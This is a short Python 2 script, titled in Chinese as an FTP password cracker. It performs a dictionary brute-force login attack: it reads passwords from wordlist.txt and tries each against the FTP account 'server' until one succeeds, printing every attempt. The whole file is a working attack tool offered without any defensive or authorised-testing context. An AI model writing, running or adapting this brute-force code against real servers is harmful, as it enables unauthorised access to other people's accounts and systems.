#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""破解 ftp 服务密码"""

from ftplib import FTP

wordlist = open('wordlist.txt', 'r')
user_login = "server"


def getPassword(password):
    try:
        ftp = FTP("server")
        ftp.login(user_login, password)
        print "user password:", password
        return True
    except Exception:
        return False


passwords = wordlist.readlines()
for password in passwords:      
    password = password.strip()
    print "test password:", password
    if getPassword(password):
        break

wordlist.close()
